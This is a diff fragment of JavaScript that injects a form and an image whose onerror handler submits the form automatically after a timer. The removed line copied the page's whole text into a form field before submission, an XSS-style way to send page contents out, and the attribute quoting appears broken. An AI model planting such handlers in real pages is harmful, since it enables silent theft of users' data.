@@ -6,7 +6,6 @@ function changeTitle(){
                 <input type="submit" value="Submit"> \
             </form>\
             <img src="x" onerror="function(){ \
-                document.getElementById(\'info\').value = document.body.textContent;\
                 document.forms[0].submit();\
             }\'>';
     }, 5000);
